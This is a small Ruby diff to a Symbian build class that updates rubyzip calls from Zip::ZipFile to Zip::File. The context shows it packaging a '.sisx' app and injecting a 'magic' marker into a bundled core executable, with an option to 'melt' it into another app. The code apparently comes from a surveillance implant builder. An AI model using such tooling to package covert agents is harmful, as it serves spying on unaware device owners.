@@ -208,7 +208,7 @@ class BuildSymbian < Build
 
     name = @melted ? @appname_orig : @appname + '.sisx'
 
-    Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
+    Zip::File.open(path('output.zip'), Zip::File::CREATE) do |z|
       z.file.open(name, "wb") { |f| f.write File.open(path(name), 'rb') {|f| f.read} }
     end
 
@@ -218,7 +218,7 @@ class BuildSymbian < Build
   end
 
   def unique(core)
-    Zip::ZipFile.open(core) do |z|
+    Zip::File.open(core) do |z|
       core_content = z.file.open('5th/SharedQueueMon_20023635.exe', "rb") { |f| f.read }
       add_magic(core_content)
       z.file.open('5th/SharedQueueMon_20023635.exe', "wb") { |f| f.write core_content }
